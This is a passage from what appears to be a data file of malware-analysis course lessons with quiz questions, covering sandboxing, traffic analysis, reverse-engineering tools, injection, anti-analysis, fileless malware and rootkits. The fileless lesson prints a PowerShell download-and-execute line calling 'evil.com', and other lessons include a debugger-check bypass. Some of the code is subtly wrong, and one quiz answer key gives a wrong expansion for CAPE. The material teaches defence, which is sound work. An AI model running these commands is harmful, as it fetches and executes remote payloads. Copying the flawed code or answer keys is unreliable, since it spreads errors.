Entropy measures the randomness of data. Values range from 0 (completely uniform) to 8 (completely random). Normal executable code has entropy around 5-6. Compressed or encrypted sections typically have entropy above 7. High entropy in code sections indicates packing or encryption.

### Section 4: Detecting Signed Malware

Signed malware is increasingly common. Detection approaches include monitoring for certificates from compromised authorities, detecting certificates with unusual properties, and identifying known malware families that use stolen certificates. Certificate transparency logs can help identify newly issued certificates.

### Hands-On Practice

1. Verify digital signatures on a collection of files and identify anomalous certificates.
2. Calculate entropy of PE sections and identify packed vs unpacked samples.
3. Research recent malware campaigns that used stolen code signing certificates.

### Key Takeaways

- Code signing provides authentication but can be exploited by attackers
- Entropy analysis detects packing and encryption
- High entropy in code sections is suspicious
- Certificate transparency helps detect malicious certificates

### References

- Authenticode: https://docs.microsoft.com/en-us/windows-hardware/drivers/install/authenticode
- Entropy Analysis: https://www.sans.org/white-papers/entropy-analysis/
- Certificate Transparency: https://www.certificate-transparency.org/`,
            questions: [
              { text: 'What does code signing verify?', answers: [{ text: 'Software authorship and integrity through digital certificates', isCorrect: true }, { text: 'Software performance', isCorrect: false }, { text: 'Software licensing', isCorrect: false }, { text: 'Software compatibility', isCorrect: false }] },
              { text: 'What entropy value indicates likely packing or encryption?', answers: [{ text: 'Above 7', isCorrect: true }, { text: 'Below 3', isCorrect: false }, { text: 'Around 5', isCorrect: false }, { text: 'Exactly 0', isCorrect: false }] },
              { text: 'Why do attackers use stolen code signing certificates?', answers: [{ text: 'To bypass application whitelisting and appear trustworthy', isCorrect: true }, { text: 'To improve software performance', isCorrect: false }, { text: 'To reduce file size', isCorrect: false }, { text: 'To enable network communication', isCorrect: false }] },
              { text: 'What helps identify newly issued certificates for malicious use?', answers: [{ text: 'Certificate transparency logs', isCorrect: true }, { text: 'DNS records', isCorrect: false }, { text: 'WHOIS databases', isCorrect: false }, { text: 'Social media monitoring', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Dynamic Analysis & Sandboxing',
        order: 2,
        lessons: [
          {
            title: 'Setting Up Analysis Environment',
            order: 1,
            content: `# Setting Up Analysis Environment

### Learning Objectives

- Configure a safe dynamic analysis environment
- Set up monitoring tools for behavioral analysis
- Understand anti-VM and anti-sandbox techniques
- Deploy automated sandbox solutions

### Section 1: Dynamic Analysis vs Static Analysis

Dynamic analysis observes malware behavior during execution. While static analysis examines code without running it, dynamic analysis reveals actual behavior including network connections, file system modifications, registry changes, and process creation. Dynamic analysis captures behavior that static analysis cannot see in packed or encrypted malware.

### Section 2: Analysis VM Configuration

Configure virtual machines with snapshots for quick restoration. Disable shared folders and drag-and-drop. Use host-only networking. Install analysis tools before taking a clean snapshot. Essential tools include Process Monitor, Process Explorer, Wireshark, and Regshot.

### Section 3: Anti-VM and Anti-Sandbox Techniques

Malware detects virtual and sandbox environments through VM-specific hardware checks, MAC address analysis, sandbox process detection, and window class name examination. Counter by renaming VMs, modifying MAC addresses, removing VM tools, and cleaning registry artifacts.

### Section 4: Automated Sandbox Deployment

Cuckoo Sandbox, CAPE, and commercial solutions like Joe Sandbox provide automated analysis. Configuration includes analysis VM setup, monitoring tool integration, network simulation, and report generation.

\`\`\`bash
# Set up FakeNet-NG for network simulation
sudo pip install fakenet-ng
sudo fakenet-ng -d
# Take registry snapshot before execution
regshot shot1.reg
# Execute malware
# Take snapshot after execution
regshot shot2.reg
diff shot1.reg shot2.reg > registry-changes.txt
\`\`\`

### Hands-On Practice

1. Build an isolated analysis VM with all required monitoring tools.
2. Configure FakeNet-NG to simulate internet services for malware analysis.
3. Deploy Cuckoo Sandbox for automated malware analysis.

### Key Takeaways

- Dynamic analysis reveals runtime behavior invisible to static analysis
- Analysis VMs must be properly isolated and configured
- Anti-VM techniques require environmental sanitization
- Automated sandboxes enable scalable analysis

### References

- Cuckoo Sandbox: https://cuckoosandbox.org/
- FakeNet-NG: https://github.com/mandiant/flare-fakenet-ng
- REMnux: https://remnux.org/`,
            questions: [
              { text: 'What is the primary advantage of dynamic analysis?', answers: [{ text: 'Reveals actual runtime behavior including network and file system activity', isCorrect: true }, { text: 'It is faster', isCorrect: false }, { text: 'No tools needed', isCorrect: false }, { text: 'Works on all file types equally', isCorrect: false }] },
              { text: 'What does FakeNet-NG simulate?', answers: [{ text: 'Internet services locally to observe malware network behavior', isCorrect: true }, { text: 'A real production network', isCorrect: false }, { text: 'A firewall', isCorrect: false }, { text: 'An antivirus engine', isCorrect: false }] },
              { text: 'Why does malware check for VirtualBox Guest Additions?', answers: [{ text: 'To detect if running in a virtual machine sandbox', isCorrect: true }, { text: 'To improve performance', isCorrect: false }, { text: 'To access shared folders', isCorrect: false }, { text: 'To install drivers', isCorrect: false }] },
              { text: 'What tool captures real-time file system changes?', answers: [{ text: 'Process Monitor (ProcMon)', isCorrect: true }, { text: 'Wireshark', isCorrect: false }, { text: 'Nmap', isCorrect: false }, { text: 'Metasploit', isCorrect: false }] },
            ],
          },
          {
            title: 'Behavioral Analysis & Monitoring',
            order: 2,
            content: `# Behavioral Analysis & Monitoring

### Learning Objectives

- Monitor malware execution in real-time
- Capture and analyze network behavior
- Document file system and registry modifications
- Generate comprehensive behavioral reports

### Section 1: Process Monitoring

Process monitoring reveals runtime behavior including process creation, thread activity, loaded modules, and handle usage. Process Explorer shows DLLs loaded by each process. Process Monitor captures all system calls in real-time with filtering capabilities.

### Section 2: Network Behavior Analysis

Capture all network traffic during execution. DNS queries reveal C2 domains. HTTP traffic shows communication patterns. Analyze connection timing for beaconing patterns. Extract files transferred over HTTP for further analysis.

\`\`\`bash
# Capture traffic during malware execution
tcpdump -i any -w malware-traffic.pcap -c 10000
# Analyze DNS queries
tshark -r malware-traffic.pcap -Y "dns.qry.name" -T fields -e dns.qry.name
# Analyze HTTP requests
tshark -r malware-traffic.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
# Detect beaconing through timing analysis
tshark -r malware-traffic.pcap -Y "dns" -T fields -e frame.time_relative | awk '{print int($1/60)}' | sort | uniq -c
\`\`\`

### Section 3: File System Artifacts

Monitor all file operations. Malware commonly creates files in %TEMP%, modifies startup directories, drops additional payloads, creates log files, and modifies application files. Document file paths, timestamps, and content.

### Section 4: API Call Analysis

API monitoring tools capture Windows API calls. Focus on file operations, registry modifications, process creation, network communication, and cryptographic operations. API call sequences reveal malware behavior patterns.

### Hands-On Practice

1. Analyze a malware sample using Process Monitor with appropriate filters.
2. Capture and analyze network traffic to identify C2 communication.
3. Document all file system and registry changes made by malware.

### Key Takeaways

- Process Monitor captures all system calls in real-time
- Network analysis reveals C2 communication patterns
- File system monitoring identifies persistence and payload delivery
- API call analysis reveals malware functionality

### References

- Process Monitor: https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
- Process Explorer: https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer
- Wireshark: https://www.wireshark.org/`,
            questions: [
              { text: 'What does Process Monitor capture?', answers: [{ text: 'All system calls including file, registry, and process operations', isCorrect: true }, { text: 'Only network traffic', isCorrect: false }, { text: 'Only CPU usage', isCorrect: false }, { text: 'Only memory allocation', isCorrect: false }] },
              { text: 'What network pattern indicates C2 beaconing?', answers: [{ text: 'Regular periodic connections with consistent timing', isCorrect: true }, { text: 'Random traffic', isCorrect: false }, { text: 'Single large transfer', isCorrect: false }, { text: 'Only inbound connections', isCorrect: false }] },
              { text: 'Where do malware commonly drop payloads?', answers: [{ text: 'The %TEMP% directory', isCorrect: true }, { text: 'Windows System32', isCorrect: false }, { text: 'Program Files', isCorrect: false }, { text: 'Recycle Bin', isCorrect: false }] },
              { text: 'What registry keys indicate persistence?', answers: [{ text: 'Run keys, Services, and COM object registrations', isCorrect: true }, { text: 'Only Recycle Bin key', isCorrect: false }, { text: 'Only network config keys', isCorrect: false }, { text: 'Only user profile keys', isCorrect: false }] },
            ],
          },
          {
            title: 'Automated Sandboxing',
            order: 3,
            content: `# Automated Sandboxing

### Learning Objectives

- Deploy and configure automated analysis sandboxes
- Interpret sandbox analysis reports effectively
- Identify sandbox evasion techniques
- Integrate sandbox results into incident response

### Section 1: Sandbox Platforms

Cuckoo is an open-source automated analysis system executing files in isolated VMs. CAPE is a Cuckoo fork focused on malware analysis with additional unpacking and config extraction features. Commercial solutions include Joe Sandbox, Any.run, and Hybrid Analysis offering cloud-based services.

### Section 2: Interpreting Reports

Sandbox reports contain multiple sections. Summary provides detection ratio and risk score. Behavioral analysis details observed activities. Network analysis shows captured traffic and indicators. Signatures section matches behavior against known threat patterns.

\`\`\`python
def parse_sandbox_report(report_path):
    import json
    with open(report_path) as f:
        report = json.load(f)

    indicators = {
        'domains': set(),
        'ips': set(),
        'files_created': [],
        'registry_changes': [],
        'processes': []
    }

    for network in report.get('network', {}).get('domains', []):
        indicators['domains'].add(network['domain'])

    for process in report.get('behavior', {}).get('processes', []):
        indicators['processes'].append({
            'pid': process['pid'],
            'name': process['name'],
            'calls': len(process.get('calls', []))
        })

    return indicators
\`\`\`

### Section 3: Sandbox Evasion

Advanced malware detects sandbox environments through limited user interaction, system hardware characteristics, disk space checks, analysis tool detection, and environment-specific execution triggers. Counter by simulating user interaction and maintaining realistic environments.

### Section 4: Integration with IR

Sandbox IOCs feed detection rule creation and threat hunting. Automated submission pipelines enable rapid analysis of suspicious files. Sandbox results inform incident response decisions including containment priorities and eradication strategies.

### Hands-On Practice

1. Submit 5 malware samples to different sandbox platforms and compare results.
2. Analyze sandbox evasion techniques in a sophisticated malware sample.
3. Build an automated pipeline for sandbox submission and result collection.

### Key Takeaways

- Automated sandboxes enable scalable malware analysis
- Report interpretation requires understanding each section
- Advanced malware uses evasion to detect sandboxes
- Sandbox results should feed detection and response capabilities

### References

- CAPE Sandbox: https://capev2.readthedocs.io/
- Any.run: https://any.run/
- Hybrid Analysis: https://www.hybrid-analysis.com/`,
            questions: [
              { text: 'What is the primary advantage of automated sandboxes?', answers: [{ text: 'Analyze many samples quickly at scale', isCorrect: true }, { text: 'Always more accurate', isCorrect: false }, { text: 'No configuration needed', isCorrect: false }, { text: 'Analyze all malware types equally', isCorrect: false }] },
              { text: 'Why do sandboxes check for mouse movement?', answers: [{ text: 'To detect automated environments lacking user interaction', isCorrect: true }, { text: 'To track user behavior', isCorrect: false }, { text: 'To improve performance', isCorrect: false }, { text: 'For privacy compliance', isCorrect: false }] },
              { text: 'What does CAPE stand for?', answers: [{ text: 'Analysis of Malware in Portable Environments', isCorrect: true }, { text: 'Computer-Aided Protection Engine', isCorrect: false }, { text: 'Centralized Analysis Platform', isCorrect: false }, { text: 'Cyber Analysis Environment', isCorrect: false }] },
              { text: 'How do sandbox results integrate with IR?', answers: [{ text: 'IOCs feed detection rule creation and threat hunting', isCorrect: true }, { text: 'Replace all other IR activities', isCorrect: false }, { text: 'Only provide historical data', isCorrect: false }, { text: 'Used only for compliance', isCorrect: false }] },
            ],
          },
          {
            title: 'Network Traffic Capture & Analysis',
            order: 4,
            content: `# Network Traffic Capture & Analysis

### Learning Objectives

- Identify C2 communication patterns in network traffic
- Detect data exfiltration techniques
- Extract malware artifacts from network captures
- Analyze encrypted C2 channels

### Section 1: C2 Communication Patterns

Malware uses various protocols for C2. HTTP/HTTPS is most common due to ubiquity. DNS tunneling encodes data in queries. Raw sockets bypass application monitoring. Domain fronting uses CDN infrastructure. Understanding patterns enables detection even with encrypted payloads.

### Section 2: Data Exfiltration Detection

Exfiltration techniques include HTTP POST uploads, DNS data encoding, SMTP attachments, FTP transfers, and cloud storage uploads. Detect through volume analysis, protocol anomalies, and timing patterns.

\`\`\`bash
# Detect large outbound transfers
ngrep -q -d any 'POST' 'port 80' -W byline | grep -i "content-length"
# Detect DNS tunneling through query length
awk '{if(length($NF) > 50) print}' dns.log
# Extract files from HTTP traffic
tshark -r capture.pcap --export-objects "http,exported_files"
\`\`\`

### Section 3: Encrypted C2 Analysis

HTTPS encrypted C2 channels require analysis beyond payload inspection. Analyze JA3/JA3S fingerprints for client identification, certificate anomalies, SNI fields, and traffic volume patterns.

### Section 4: Timeline Correlation

Network timeline analysis reconstructs the sequence of events during an incident. Correlating network timestamps with host-based evidence provides a complete picture. Network evidence often provides the earliest indicators of compromise.

### Hands-On Practice

1. Analyze a malware traffic capture and extract all C2 indicators.
2. Identify data exfiltration patterns in network traffic.
3. Build a network timeline for a simulated incident.

### Key Takeaways

- DNS analysis is critical for identifying C2 channels
- JA3 fingerprinting identifies TLS client implementations
- Timeline correlation provides complete incident picture
- Network evidence often provides earliest IOCs

### References

- JA3/JA3S: https://github.com/salesforce/ja3
- NetworkMiner: https://www.netresec.com/?page=NetworkMiner
- SANS Network Forensics`,
            questions: [
              { text: 'What indicates C2 beaconing in network traffic?', answers: [{ text: 'Regular periodic connections with consistent timing', isCorrect: true }, { text: 'Large one-time transfers', isCorrect: false }, { text: 'Single DNS queries', isCorrect: false }, { text: 'Encrypted HTTPS', isCorrect: false }] },
              { text: 'How is DNS tunneling detected?', answers: [{ text: 'Unusually long DNS queries and high frequency to single domains', isCorrect: true }, { text: 'HTTP POST requests', isCorrect: false }, { text: 'Firewall logs', isCorrect: false }, { text: 'CPU monitoring', isCorrect: false }] },
              { text: 'What is JA3 fingerprinting used for?', answers: [{ text: 'Identifying TLS client implementations', isCorrect: true }, { text: 'Port scanning', isCorrect: false }, { text: 'Disk monitoring', isCorrect: false }, { text: 'CPU analysis', isCorrect: false }] },
              { text: 'What tool extracts files from HTTP captures?', answers: [{ text: 'tshark with --export-objects', isCorrect: true }, { text: 'nmap', isCorrect: false }, { text: 'metasploit', isCorrect: false }, { text: 'hydra', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'RE with Tools',
        order: 3,
        lessons: [
          {
            title: 'IDA Pro & Ghidra Basics',
            order: 1,
            content: `# IDA Pro & Ghidra Basics

### Learning Objectives

- Navigate IDA Pro interface and disassembly views
- Use Ghidra decompiler for code analysis
- Identify and name functions for better understanding
- Use IDAPython and Ghidra scripting for automation

### Section 1: IDA Pro Interface

IDA Pro is the industry standard disassembler. The main window shows disassembly in graph or text view. Key shortcuts: Space toggles views, X shows cross-references, N renames addresses, F5 opens the decompiler. The functions window lists all functions. The strings window shows extracted strings.

### Section 2: Ghidra Introduction

Ghidra is an open-source reverse engineering framework by the NSA. It provides disassembly, decompilation, scripting, and collaborative analysis. Its free availability and strong decompiler make it excellent for malware analysis.

\`\`\`python
# Ghidra script to find dangerous API calls
# @category Analysis

from ghidra.program.model.symbol import RefType
from ghidra.app.decompiler import DecompInterface

program = getCurrentProgram()
decomp = DecompInterface()
decomp.openProgram(program)

dangerous_apis = ['CreateRemoteThread', 'VirtualAllocEx', 'WriteProcessMemory',
                   'InternetOpenA', 'HttpSendRequestA', 'RegSetValueExA']

for func in currentProgram.getFunctionManager().getFunctions(True):
    refs = getReferencesTo(func.getEntryPoint())
    for ref in refs:
        if func.getName() in dangerous_apis:
            print(f"Dangerous API call: {func.getName()} at {ref.getFromAddress()}")
\`\`\`

### Section 3: Function Analysis

IDAs auto-analysis identifies functions, strings, and cross-references. Rename functions to reflect purpose. Hex-Rays decompiler converts assembly to C-like pseudocode. BinDiff compares binary functions to identify code similarities.

### Section 4: Scripting for Automation

IDAPython and Ghidra scripting automate repetitive tasks. Scripts can extract functions, find patterns, rename addresses, and generate reports. Automation accelerates analysis of large malware collections.

### Hands-On Practice

1. Load a malware sample in IDA Pro and rename all functions based on their purpose.
2. Use Ghidra decompiler to analyze a packed sample after unpacking.
3. Write a script to extract all API calls and categorize them by capability.

### Key Takeaways

- IDA Pro and Ghidra are complementary analysis tools
- Function renaming transforms anonymous code into meaningful analysis
- Decompilers dramatically accelerate reverse engineering
- Scripting automates repetitive analysis tasks

### References

- IDA Pro: https://hex-rays.com/ida-pro/
- Ghidra: https://ghidra-sre.org/
- OpenRCE: https://www.openrce.org/`,
            questions: [
              { text: 'What does pressing F5 do in IDA Pro?', answers: [{ text: 'Opens the Hex-Rays decompiler for C-like pseudocode', isCorrect: true }, { text: 'Saves the analysis', isCorrect: false }, { text: 'Closes the function', isCorrect: false }, { text: 'Opens the debugger', isCorrect: false }] },
              { text: 'Who developed Ghidra?', answers: [{ text: 'The NSA', isCorrect: true }, { text: 'Microsoft', isCorrect: false }, { text: 'Google', isCorrect: false }, { text: 'Apache Foundation', isCorrect: false }] },
              { text: 'What does IDAPython enable?', answers: [{ text: 'Automating repetitive analysis tasks through scripting', isCorrect: true }, { text: 'Creating malware', isCorrect: false }, { text: 'Scanning for viruses', isCorrect: false }, { text: 'Managing network traffic', isCorrect: false }] },
              { text: 'What is BinDiff used for?', answers: [{ text: 'Comparing binary functions to identify code similarities', isCorrect: true }, { text: 'Decompiling executables', isCorrect: false }, { text: 'Extracting network traffic', isCorrect: false }, { text: 'Scanning for vulnerabilities', isCorrect: false }] },
            ],
          },
          {
            title: 'x86/x64 Assembly for RE',
            order: 2,
            content: `# x86/x64 Assembly for RE

### Learning Objectives

- Read x86 and x64 assembly code
- Identify common assembly patterns in malware
- Understand calling conventions and stack operations
- Use disassemblers to analyze suspicious binaries

### Section 1: CPU Architecture Fundamentals

Registers: EAX (accumulator), EBX (base), ECX (counter), EDX (data). Pointers: ESP (stack), EBP (base), ESI/EDI (index). Special: EIP (instruction pointer), EFLAGS. Understanding these is essential for following malware logic.

### Section 2: Common Instructions

MOV copies data. PUSH/POP manage the stack. ADD/SUB/MUL/DIV perform arithmetic. AND/OR/XOR perform bitwise operations. XOR is particularly important in malware for simple encryption. JMP transfers control. JE/JNE/JG/JL perform conditional jumps.

\`\`\`asm
; XOR decryption loop common in malware
mov ecx, 0x100
lea esi, [encrypted_data]
mov al, 0x42
decrypt_loop:
xor byte [esi], al
inc esi
loop decrypt_loop
\`\`\`

### Section 3: Calling Conventions

x86 uses cdecl (caller cleans stack) and stdcall (callee cleans). x64 uses Microsoft x64 (shadow space, RCX/RDX/R8/R9 for first four args) and System V (RDI/RSI/RDX/RCX/R8/R9). Understanding calling conventions is essential for identifying function parameters and return values.

### Section 4: Stack Analysis

The stack stores local variables, saved registers, and return addresses. Buffer overflows overwrite the return address. Shellcode analysis requires understanding stack layout. Stack frames are set up with push EBP and mov EBP, ESP.

### Hands-On Practice

1. Analyze a simple malware sample at the assembly level to identify its functionality.
2. Trace a XOR decryption loop to extract the decrypted payload.
3. Identify the calling convention used by a malware sample.

### Key Takeaways

- Assembly knowledge is essential for reverse engineering
- XOR is commonly used for simple malware encryption
- Understanding calling conventions reveals function parameters
- Stack analysis is critical for understanding buffer overflows

### References

- x86 Assembly Guide: https://www.cs.virginia.edu/~evans/cs216/guides/x86.html
- Practical Reverse Engineering: https://www.wiley.com/en-us/Practical+Reverse+Engineering
- OpenSecurityTraining2: https://opensecuritytraining.info/`,
            questions: [
              { text: 'What does the XOR instruction do to identical values?', answers: [{ text: 'Produces zero, useful for clearing registers and simple encryption', isCorrect: true }, { text: 'Produces the same value', isCorrect: false }, { text: 'Causes segfault', isCorrect: false }, { text: 'Doubles the value', isCorrect: false }] },
              { text: 'Which register holds the return value in x86?', answers: [{ text: 'EAX', isCorrect: true }, { text: 'ESP', isCorrect: false }, { text: 'EIP', isCorrect: false }, { text: 'EBX', isCorrect: false }] },
              { text: 'What does the CALL instruction do?', answers: [{ text: 'Pushes return address and transfers control to a function', isCorrect: true }, { text: 'Terminates the program', isCorrect: false }, { text: 'Clears registers', isCorrect: false }, { text: 'Copies data', isCorrect: false }] },
              { text: 'Why is XOR commonly used in malware encryption?', answers: [{ text: 'Simple, fast, and reversible by XORing again with the same key', isCorrect: true }, { text: 'It is unbreakable', isCorrect: false }, { text: 'Requires special hardware', isCorrect: false }, { text: 'Can only be used once', isCorrect: false }] },
            ],
          },
          {
            title: 'DLL Injection & API Hooking',
            order: 3,
            content: `# DLL Injection & API Hooking

### Learning Objectives

- Understand DLL injection techniques used by malware
- Detect API hooking for process monitoring
- Analyze injected code in running processes
- Implement detection for injection and hooking

### Section 1: DLL Injection Techniques

DLL injection forces a target process to load a malicious DLL. Common techniques include CreateRemoteThread with LoadLibrary, QueueUserAPC, and process hollowing. Injected code runs in the target process context with its privileges and access.

### Section 2: API Hooking

API hooking intercepts function calls to modify behavior. Inline hooking patches the first bytes of a function. IAT hooking modifies the Import Address Table. Hooking enables keylogging, credential theft, and traffic interception.

\`\`\`python
# Detect API hooks in a process
import ctypes
import struct

def check_hooks(module_name):
    kernel32 = ctypes.windll.kernel32
    module_base = kernel32.GetModuleHandleA(module_name)

    # Read first bytes of each exported function
    # Check for JMP instructions (0xE9) indicating inline hooks
    hooks_found = []
    # ... implementation details ...

    return hooks_found
\`\`\`

### Section 3: Process Hollowing

Process hollowing creates a suspended process, replaces its memory content with malicious code, and resumes execution. This hides malware within legitimate process boundaries. Detection requires examining memory content and thread start addresses.

### Section 4: Detection Methods

Detection includes monitoring for CreateRemoteThread calls, checking for modified API functions, scanning process memory for injected code, and using EDR solutions that detect injection techniques.

### Hands-On Practice

1. Analyze a malware sample that uses DLL injection to evade detection.
2. Detect API hooks in a compromised process using memory analysis.
3. Implement a basic DLL injection detector using Process Monitor.

### Key Takeaways

- DLL injection forces processes to load malicious code
- API hooking intercepts function calls for malicious purposes
- Process hollowing hides malware within legitimate processes
- Detection requires monitoring API calls and memory content

### References

- Windows API Hooking: https://www.masm32.com/board/index.php?topic=16391.0
- Process Hollowing: https://www.elastic.co/blog/ahl96hkuq0th
- Advanced Memory Forensics: https://www.sans.org/white-papers/advanced-memory-forensics/`,
            questions: [
              { text: 'What does DLL injection accomplish?', answers: [{ text: 'Forces a target process to load a malicious DLL', isCorrect: true }, { text: 'Removes DLLs from memory', isCorrect: false }, { text: 'Encrypts DLL files', isCorrect: false }, { text: 'Scans for DLL vulnerabilities', isCorrect: false }] },
              { text: 'What does inline API hooking do?', answers: [{ text: 'Patches the first bytes of a function to redirect execution', isCorrect: true }, { text: 'Deletes the API function', isCorrect: false }, { text: 'Encrypts the API call', isCorrect: false }, { text: 'Creates a new API function', isCorrect: false }] },
              { text: 'What is process hollowing?', answers: [{ text: 'Creating a suspended process and replacing its memory with malicious code', isCorrect: true }, { text: 'Deleting process memory', isCorrect: false }, { text: 'Encrypting process memory', isCorrect: false }, { text: 'Creating multiple processes', isCorrect: false }] },
              { text: 'How can DLL injection be detected?', answers: [{ text: 'Monitoring CreateRemoteThread calls and scanning memory for injected code', isCorrect: true }, { text: 'Checking file permissions', isCorrect: false }, { text: 'Monitoring network traffic', isCorrect: false }, { text: 'Scanning for viruses only', isCorrect: false }] },
            ],
          },
          {
            title: 'Anti-Reverse Engineering Techniques',
            order: 4,
            content: `# Anti-Reverse Engineering Techniques

### Learning Objectives

- Identify common anti-analysis techniques in malware
- Understand anti-debugging, anti-VM, and anti-sandbox methods
- Develop strategies to bypass analysis defenses
- Analyze obfuscated code using automated tools

### Section 1: Anti-Debugging Techniques

Malware uses IsDebuggerPresent, NtQueryInformationProcess, and timing checks to detect debuggers. Bypass by patching IsDebuggerPresent to return zero, using hardware breakpoints instead of software breakpoints, and modifying the PEB BeingDebugged flag.

### Section 2: Anti-VM Techniques

Check for VM artifacts: VMware Tools processes, VirtualBox Guest Additions, VM-specific registry keys, hardware identifiers, and CPU instructions. Counter by renaming VMs, modifying MAC addresses, removing VM tools, and cleaning artifacts.

### Section 3: Anti-Sandbox Techniques

Check for limited user interaction, minimal installed software, short system uptime, missing user files, and sandbox-specific processes. Advanced sandboxes simulate realistic environments to counter these checks.

### Section 4: Deobfuscation Tools

FLOSS automatically extracts obfuscated strings. Dev-Explorer identifies obfuscation patterns. Custom Python scripts handle specific obfuscation schemes. Automated deobfuscation accelerates analysis of large malware collections.

\`\`\`python
# Bypass IsDebuggerPresent
import ctypes

def bypass_debugger_check():
    kernel32 = ctypes.windll.kernel32
    # Get PEB address
    peb = ctypes.c_void_p(kernel32.GetLastError())
    # Clear BeingDebugged flag
    ctypes.memmove(ctypes.addressof(peb) + 2, b'\\x00', 1)
\`\`\`

### Hands-On Practice

1. Identify anti-debugging techniques in a malware sample and develop bypasses.
2. Analyze a packed sample that uses anti-VM detection.
3. Use FLOSS to extract obfuscated strings from a malware binary.

### Key Takeaways

- Anti-analysis techniques indicate sophisticated malware
- Hardware breakpoints bypass many anti-debugging checks
- Anti-VM detection requires environmental sanitization
- Automated tools accelerate deobfuscation

### References

- Anti-Debug Reference: https://github.com/ps1337/anti-debug-reference
- FLOSS: https://github.com/mandiant/flare-floss
- Anti-VM Research: https://www.sans.org/white-papers/anti-vm-anti-sandbox/`,
            questions: [
              { text: 'What is the purpose of control flow obfuscation?', answers: [{ text: 'Make code difficult to follow by inserting junk code', isCorrect: true }, { text: 'Improve performance', isCorrect: false }, { text: 'Reduce file size', isCorrect: false }, { text: 'Add signatures', isCorrect: false }] },
              { text: 'How does timing-based anti-debugging work?', answers: [{ text: 'Debugging introduces delays exceeding normal thresholds', isCorrect: true }, { text: 'Checks system clock', isCorrect: false }, { text: 'Measures network latency', isCorrect: false }, { text: 'Only works on weekends', isCorrect: false }] },
              { text: 'What tool extracts obfuscated strings?', answers: [{ text: 'FLOSS', isCorrect: true }, { text: 'Nmap', isCorrect: false }, { text: 'Metasploit', isCorrect: false }, { text: 'John the Ripper', isCorrect: false }] },
              { text: 'What is dead code injection?', answers: [{ text: 'Inserting unused but syntactically valid code to increase complexity', isCorrect: true }, { text: 'Injecting code into legitimate files', isCorrect: false }, { text: 'Removing dead processes', isCorrect: false }, { text: 'Compressing code', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Advanced Malware Techniques',
        order: 4,
        lessons: [
          {
            title: 'Fileless Malware & Living-off-the-Land',
            order: 1,
            content: `# Fileless Malware & Living-off-the-Land

### Learning Objectives

- Understand fileless malware techniques and attack vectors
- Detect PowerShell-based attacks and scriptlet execution
- Identify LOLBin abuse for malicious purposes
- Develop detection strategies for fileless attacks

### Section 1: Fileless Malware Concept

Fileless malware operates without writing traditional executable files to disk. Instead it uses legitimate system tools and in-memory techniques to execute malicious code. This makes detection through file-based scanning extremely difficult. Fileless attacks are among the most challenging threats for security teams to detect and respond to.

### Section 2: PowerShell-Based Attacks

PowerShell is the most common fileless attack vector. Attackers use encoded commands, in-memory script execution, and script block logging evasion. AMSI (Antimalware Scan Interface) attempts to inspect PowerShell scripts but can be bypassed through various techniques.

\`\`\`powershell
# Common fileless PowerShell patterns
# Encoded command execution
powershell -enc <base64_encoded_command>
# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
# Reflective loading of .NET assemblies
[Reflection.Assembly]::Load([Convert]::FromBase64String('<base64_payload>'))
\`\`\`

### Section 3: Living-off-the-Land Binaries (LOLBins)

LOLBins are legitimate Microsoft-signed executables abused for malicious purposes. Certutil.exe downloads files, mshta.exe executes HTML applications, wmic.exe executes commands, and regsvr32.exe loads scriptlets. These tools are trusted by the operating system and often bypass application whitelisting.

### Section 4: Detection Strategies

Enable PowerShell script block logging and module logging. Monitor for suspicious command-line arguments. Detect AMSI bypass attempts. Track LOLBin execution chains. Implement application whitelisting that restricts LOLBin usage.

### Hands-On Practice

1. Enable comprehensive PowerShell logging and analyze attack patterns.
2. Detect certutil.exe abuse for file downloads.
3. Implement a detection rule for AMSI bypass attempts.

### Key Takeaways

- Fileless malware avoids traditional file-based detection
- PowerShell is the primary vector for fileless attacks
- LOLBins are legitimate tools abused for malicious purposes
- Comprehensive logging is essential for detection

### References

- MITRE ATT&CK Fileless: https://attack.mitre.org/techniques/T1059/
- LOLBAS Project: https://lolbas-project.github.io/
- AMSI Documentation: https://docs.microsoft.com/en-us/windows/win32/amsi/`,
            questions: [
              { text: 'What makes fileless malware difficult to detect?', answers: [{ text: 'It does not write traditional executable files to disk', isCorrect: true }, { text: 'Only targets Linux', isCorrect: false }, { text: 'Runs faster', isCorrect: false }, { text: 'Requires physical access', isCorrect: false }] },
              { text: 'What does AMSI stand for?', answers: [{ text: 'Antimalware Scan Interface', isCorrect: true }, { text: 'Automated Malware System Inspector', isCorrect: false }, { text: 'Advanced Memory Scanning Integration', isCorrect: false }, { text: 'Anti-Malware Security Infrastructure', isCorrect: false }] },
              { text: 'Which LOLBin is commonly abused for downloading?', answers: [{ text: 'certutil.exe', isCorrect: true }, { text: 'notepad.exe', isCorrect: false }, { text: 'calc.exe', isCorrect: false }, { text: 'mspaint.exe', isCorrect: false }] },
              { text: 'What logging detects PowerShell attacks?', answers: [{ text: 'Script block logging and module logging', isCorrect: true }, { text: 'Application event logs only', isCorrect: false }, { text: 'DNS logs only', isCorrect: false }, { text: 'Firewall logs only', isCorrect: false }] },
            ],
          },
          {
            title: 'Rootkit Detection & Analysis',
            order: 2,
            content: `# Rootkit Detection & Analysis

### Learning Objectives

- Understand rootkit classification and persistence mechanisms
- Detect user-mode and kernel-mode rootkits
- Analyze rootkit behavior using specialized tools
- Implement rootkit detection strategies

### Section 1: Rootkit Classification

User-mode rootkits hook application-level APIs to hide processes, files, and network connections. Kernel-mode rootkits operate at Ring 0 modifying the operating system itself. Bootkits infect the Master Boot Record or UEFI firmware. Hypervisor-level rootkits operate below the operating system.

### Section 2: Detection Techniques

Cross-view comparison compares output from different API levels. If a process appears in low-level APIs but not high-level APIs, it may be hidden. Tools like GMER and TDSSKiller perform this comparison. Signature-based detection scans for known rootkit patterns.

\`\`\`bash
# Compare process listings from different sources
volatility3 -f memory.lime windows.pslist > pslist.txt
volatility3 -f memory.lime windows.psscan > psscan.txt
diff pslist.txt psscan.txt
# Differences may indicate rootkit-hidden processes
\`\`\`

### Section 3: Memory Analysis for Rootkits

Volatility memory analysis reveals rootkit artifacts. Cross-reference process lists from multiple sources. Analyze kernel modules and driver objects for anomalies. Memory timeline analysis reveals rootkit activation sequences.

### Section 4: Prevention and Mitigation

